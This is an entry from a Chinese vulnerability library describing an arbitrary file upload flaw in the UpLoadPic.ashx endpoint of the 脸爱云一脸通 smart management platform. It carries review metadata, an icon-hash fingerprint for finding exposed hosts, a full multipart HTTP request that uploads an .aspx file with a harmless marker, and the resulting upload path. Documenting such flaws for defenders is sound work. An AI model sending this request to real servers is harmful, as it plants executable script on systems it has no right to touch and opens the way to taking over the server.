---
source: "wy876 漏洞文库"
title: "脸爱云一脸通智慧管理平台 UpLoadPic.ashx任意上传"
product: "脸爱云一脸通智慧管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，ASPX执行目录与页语言条件"
prerequisites: "未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pq3pt0qifwh7x5wo"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%84%B8%E7%88%B1%E4%BA%91/%E8%84%B8%E7%88%B1%E4%BA%91%E4%B8%80%E8%84%B8%E9%80%9A%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UpLoadPic%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.icon=="
hunter: "web.icon==\"4f0be080512ee0b45fc90ff894b6ba60\""
id: "vw-22f2be40f0e1ba96efc640d5"
entity_id: "ve-22f2be40f0e1ba96efc640d5"
schema_version: "1"
---

# 脸爱云一脸通智慧管理平台 UpLoadPic.ashx任意上传

## 条目说明

- 对象与具体问题：脸爱云一脸通智慧管理平台；UpLoadPic.ashx任意上传
- 版本、配置及部署条件：版本未知，ASPX执行目录与页语言条件
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- ASPX片段用VB样式response.write无页语言声明，能否执行依服务器默认语言
- 固定随机上传路径必须由实际响应获得，文中缺上传/执行返回
- Content-Length静态，Hunter错入fofa；需要说明安全清理与修复版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台UpLoadPic存在任意文件上传漏洞。攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 脸爱云一脸通智慧管理平台

## 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征


## 四、漏洞复现
```http
POST /UpLoadPic.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
X-Requested-With: XMLHttpRequest

------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"

post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
Content-Type: image/png

<% response.write("FC5E038D38A57032085441E7FE7010B0") %>
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"


------WebKitFormBoundarywt7cEu1eBdibB13u--
```

> 请求长度说明：原资料 Content-Length 为 431；静态长度已移除，应由客户端根据最终请求体的字节数生成。


文件上传位置

```java
/images/48884063e99e45ba9fc0fa7e138261021.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pq3pt0qifwh7x5wo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
